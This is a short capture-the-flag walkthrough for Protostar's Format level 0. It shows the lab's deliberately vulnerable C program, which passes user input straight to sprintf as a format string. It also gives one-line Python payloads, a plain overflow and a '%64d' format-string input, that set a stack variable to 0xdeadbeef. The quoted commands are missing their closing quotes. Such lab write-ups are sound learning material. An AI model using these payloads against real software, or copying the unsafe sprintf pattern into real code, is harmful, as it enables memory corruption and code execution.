These are the solutions and walkthroughs for the Format set of challenges in the Protostar Wargame.

Level 0 -
This is the first challenge of the format set which is based around using format strings. In this first challenge the
task is to change a value to equal deadbeef. This is very similar to the narnia challenge from overthewire. The
source code for the challenge is here

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
 volatile int target;
 char buffer[64];

 target = 0;

 sprintf(buffer, string);

 if(target == 0xdeadbeef) {
  printf("you have hit the target correctly :)\n");
 }
}

int main(int argc, char **argv)
{
 vuln(argv[1]);
}

The solution that would be normally used will have to be modified as there is a restriction which is that the
solution should be done in less than 10 bytes of input. This means that instead of using the obvious

python -c 'print "A"*64+"\xef\xbe\xad\xde

there will have to be some modification. There are some great materials available on string formating attacks which
include this tutorial

Due to hex formatting the solution in order to be valid will have to change to

python -c 'print "%64d\xef\xbe\xad\xde

Not hugely different but enough to pass the challenge.
